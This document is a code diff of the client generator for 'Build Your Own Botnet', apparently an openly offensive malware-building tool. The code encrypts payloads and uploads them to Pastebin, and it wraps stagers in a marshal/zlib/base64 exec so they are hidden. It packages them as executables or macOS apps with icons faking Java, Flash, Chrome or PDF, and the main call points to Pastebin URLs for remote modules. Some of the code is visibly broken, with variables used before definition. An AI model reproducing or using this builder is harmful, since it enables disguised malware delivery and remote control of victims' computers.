@@ -8,13 +8,17 @@ from __future__ import print_function
 # standard library
 import os
 import sys
+import json
+import zlib
+import base64
 import urllib
+import marshal
 import colorama
+import argparse
 import subprocess
 # byob
-import util
-import stager
-import crypto
+from . import util
+from . import crypto
 
 class ClientError(Exception):
     pass
@@ -22,92 +26,85 @@ class ClientError(Exception):
 colorama.init(autoreset=False)
 
 
-@util.config(platforms=['win32','linux2','darwin'])
-def py(source='payload.py', payload='https://pastebin.com/raw/yt6GnYx4', **kwargs):
+def py(options, payload='payload.py', stager='stager.py'):
     try:
+        with open(payload, 'r') as fp:
+            payload = fp.read()
+        with open(stager, 'r') as fp:
+            stager = fp.read()
+        stager = '\n'.join(['#!/usr/bin/python',"from __future__ import print_function", stager, "if __name__=='__main__':", "\t{}=main(config={})".format(util.variable(1), json.dumps(dict(options._get_kwargs())))])
+        color = colorama.Fore.RESET
+        name = 'byob_%s.py' % util.variable(3)
         path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', name)
-        key  = base64.b64decode('uuYGm6cUAIwup6kWybUOZw==')
-        if bool(len(sys.argv) > 1 and len(sys.argv) < 3):
-            if os.path.isfile(sys.argv[1]):
-                source = sys.argv[1]
-            if os.path.isfile(sys.argv[2]):
-                path = sys.argv[2]
-        code = open(source,'r').read()
-        print(colorama.Fore.RESET + colorama.Style.DIM)
-        print("Encrypting {} ({:,} bytes)...".format(os.path.basename(source), len(code)))
-        data = encrypt_xor(code, key)
-        with file(dst,'w') as fp:
-            fp.write(data)
-        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Complete", end="")
-        print(colorama.Style.BRIGHT + colorama.Fore.RESET + "{:,} bytes written to target file: {}".format(len(data), os.path.basename(dst)).ljust(80 - len("[+] ")))
-
-
-        code = ['#!/usr/bin/python',"from __future__ import print_function", open('resources/stager.py','r').read(), "if __name__=='__main__':", "\t{}=Stager(config='{}', debug=('--debug' in sys.argv or 'debug' in sys.argv))".format(util.variable(1), payload)]
-        data = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile('\n'.join(code), '', 'exec')), 9))))
+        if options.name:
+            name = options.name
+            path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', name)
+        if options.encrypt:
+            key = os.urandom(16)
+            print(colorama.Fore.RESET + colorama.Style.BRIGHT + "Encrypting payload ({:,} bytes)...\n".format(len(payload)))
+            code = crypto.encrypt_xor(payload, key, block_size=8, key_size=16, num_rounds=32, padding='\x00')
+            diff = round(float(100.0 * float(1.0 - float(len(code))/float(len(payload)))))
+            print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Payload encryption complete")
+            print(color + colorama.Style.DIM + "    (Plaintext {:,} bytes {} to ciphertext {:,} bytes ({}% {})".format(len(stager), 'increased' if diff else 'reduced', len(code), diff, 4), 'larger' if diff else 'smaller').ljust(80 - len("[+] "))
+            payload = code
+            url = util.pastebin(payload)
+            print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Upload to Pastebin complete")
+            print(color + colorama.Style.DIM + "    ({:,} bytes uploaded to: {}".format(len(payload), url).ljust(80 - len("[+] ")))    
+        if options.obfuscate:
+            code = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
+            diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
+            print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Stager obfuscation and minification complete")
+            print(color + colorama.Style.DIM + "    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if diff else 'reduced', len(code), diff,  'larger' if diff else 'smaller').ljust(80 - len("[+] ")))
+            stager = code
         with file(path, 'w') as fp:
-            fp.write(data)
+            fp.write(stager)
+        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " +  colorama.Fore.RESET + "Client stager generation complete")
+        print(color + colorama.Style.DIM + "    ({:,} bytes written to file: {})".format(len(stager), path).ljust(80 - len("[+] ")))   
+        if options.type == 'exe':
+            path = exe(options)            
         return path
     except Exception as e:
-        return'{} error: {}'.format(py.func_name, str(e))
+        raise ClientError(str(e))
 
-
-@util.config(platforms=['win32','linux2'])
-def exe(**kwargs):
+def exe(options, filename):
     try:
-        path = kwargs.get('path')
-        if not path:
-            return "Error: missing keyword argument 'path'"
-        if not os.path.exists(path):
-            return "Error: file '%s' not found" % path
-        if sys.platform not in ('win32','linux2','darwin'):
-            return "Cannot compile executables compatible with %s platforms" % sys.platform
-        os.chdir(os.path.dirname(path))
         orig    = os.getcwd()
-        pyname  = os.path.basename(path)
+        os.chdir(os.path.dirname(filename))
+        pyname  = os.path.basename(filename)
         name    = os.path.splitext(pyname)[0]
-        dist    = os.path.dirname(path)
+        dist    = os.path.dirname(filename)
         key     = util.variable(16)
-        apps    = [i for i in ['flash','java','chrome','firefox','safari','explorer','edge','word','excel','pdf'] if i in name]
-        appicon = util.resource('resource icon %s' % apps[0]) if len(apps) else util.resource('resource icon java')
-        icon    = util.wget(appicon) if os.name != 'nt' else os.path.splitdrive(util.wget(appicon))[1].replace('\\','/')
-        pkgs    = list(set([i.strip().split()[1] for i in open(path).read().splitlines() if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in urllib.urlopen(json.loads(util.resource('stager config')).get('w')).read().splitlines() if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
-        spec    = util.resource('resource stager spec').replace('[HIDDEN_IMPORTS]', str(pkgs)).replace('[ICON_PATH]', icon).replace('[PY_FILE]', pyname).replace('[DIST_PATH]', dist).replace('[NAME]', name).replace('[128_BIT_KEY]', key)
+        icon    = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
+        pkgs    = list(set([i.strip().split()[1] for i in open(filename).read().splitlines() if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in urllib.urlopen(json.loads(open('resources/setup.sqlpackages.json').read()).get('w')).read().splitlines() if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
+        spec    = open('resources/pyinstaller.spec','r').read().replace('[HIDDEN_IMPORTS]', str(pkgs)).replace('[ICON_PATH]', icon).replace('[PY_FILE]', pyname).replace('[DIST_PATH]', dist).replace('[NAME]', name).replace('[128_BIT_KEY]', key)
         fspec   = os.path.join(dist, name + '.spec')
         with file(fspec, 'w') as fp:
             fp.write(spec)
         make  = subprocess.Popen('%s -m PyInstaller %s' % (sys.executable, fspec), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
-        exe   = os.path.join(os.path.join(dist, 'dist'), name + '.exe' if os.name is 'nt' else name)
-        if 'posix' in os.name:
-            os.chmod(exe, 755)
-        _  = map(util.delete, (path, fspec, os.path.join(dist, 'build')))
+        exe   = os.path.join(os.path.join(dist, 'dist'), name + '.exe')
+        _  = map(util.delete, (filename, fspec, os.path.join(dist, 'build')))
         os.chdir(orig)
         return exe
     except Exception as e3:
-        return'{} error: {}'.format(client_exe.func_name, str(e3))
+        raise ClientError('{} error: {}'.format(client_exe.func_name, str(e3)))
 
-
-@util.config(platforms=['darwin'])
-def app(**kwargs):
+def app(options, filename):
     try:
-        if not kwargs.get('path'):
-            return "Error: missing keyword argument 'path'"
-        filename        = kwargs.get('path')
-        iconName        = kwargs.get('icon') if os.path.isfile(str(kwargs.get('icon'))) else util.resource('resource icon %s.png' % random.choice(['flash','java','chrome','firefox']))
-        iconFile        = util.wget(iconName)
+        iconFile        = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
         version         = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
         baseName        = os.path.basename(filename)
         bundleName      = os.path.splitext(baseName)[0]
         pkgPath         = os.path.join(basePath, 'PkgInfo')
         appPath         = os.path.join(os.getcwd(), '%.app' % bundleName)
         basePath        = os.path.join(appPath, 'Contents')
-        distPath 	    = os.path.join(basePath, 'MacOS')
+        distPath 	= os.path.join(basePath, 'MacOS')
         rsrcPath        = os.path.join(basePath, 'Resources')
         plistPath       = os.path.join(rsrcPath, 'Info.plist')
         iconPath        = os.path.basename(iconFile)
         executable      = os.path.join(distPath, filename)
-        bundleVersion   = ' '.join(bundleName, version)
-        bundleIdentity  = 'com.' + bundleName
-        infoPlist       = urllib2.urlopen(util.resource('resource plist')).read() % (baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
+        bundleVersion   = '%s %s'  % (bundleName, version)
+        bundleIdentity  = 'com.%s' % bundleName
+        infoPlist       = urllib2.urlopen(util.resource('resources/plist.plist')).read() % (baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
         os.makedirs(distPath)
         os.mkdir(rsrcPath)
         with file(pkgPath, "w") as fp:
@@ -115,30 +112,30 @@ def app(**kwargs):
         with file(plistPath, "w") as fw:
             fw.write(infoPlist)
         os.rename(filename, os.path.join(distPath, baseName))
-        _ = os.popen('chmod +x %s' % executable).read()
         return appPath
     except Exception as e:
-        return "{} error: {}".format(client_app.func_name, str(e))
+        raise ClientError("{} error: {}".format(client_app.func_name, str(e)))
 
-def usage():
-    util.display("usage: client.py <type> [,name,icon]\n    type:\tpy, exe, app\n    icon:\tpdf, java, flash\n    name:\tup to 20 alphanumeric characters", color='yellow', style='dim')
+    
+def main(*args, **kwargs):
+    try:
+        print(colorama.Fore.RESET + colorama.Style.BRIGHT + "\n\n\tClient Generator | Build Your Own Botnet\n")
+        parser = argparse.ArgumentParser(prog='client.py', usage='client.py {py,exe,app} host port [options]', description="Client Generator (Build Your Own Botnet)", version='0.4.7')
+        parser.add_argument('type', action='store', help='python, executable, app bundle', choices=['py','exe','app'])
+        parser.add_argument('host', action='store', type=str, default='localhost', help='server IP')
+        parser.add_argument('port', action='store', type=int, default=1337, help='server port')
+        parser.add_argument('--repo', action='store', help='base URL for remote imports')
+        parser.add_argument('--name', action='store', help='output filename')
+        parser.add_argument('--icon', action='store', help='java, flash, chrome, firefox, safari')
+        parser.add_argument('--obfuscate', action='store_true', default=False, help='obfuscate both payload and stager')
+        parser.add_argument('--encrypt', action='store_true', default=False, help='encrypt both payload and stager')
+        options = parser.parse_args()
+        return py(options)
+    except Exception as e:
+        parser.error(e)
 
-def main():
-    args = {}
-    if not len(sys.argv) > 1 or sys.argv[1] not in ('py','exe','app'):
-        usage()
-    else:
-        mode = sys.argv[1].lower()
-        name = 'byob_%s' % util.variable(3)
-        icon = 'pdf' if mode in ('exe','app') else None
-        if len(sys.argv) > 2:
-            args = util.kwargs(' '.join(sys.argv[2:]))
-            name = kwargs.get('name') if 'name' in args else name
-            icon = kwargs.get('icon') if kwargs.get('icon') in ('java','flash','pdf') else icon
-        try:
-            return eval(mode)(name=name, icon=icon)
-        except Exception as e:
-            raise ClientError(str(e))
-            
 if __name__ == '__main__':
-    main()
+    main(**{"modules": "https://pastebin.com/raw/Z5z5cjny" ,"api_key":"https://pastebin.com/raw/QPAJs08x"})
+
+
+                
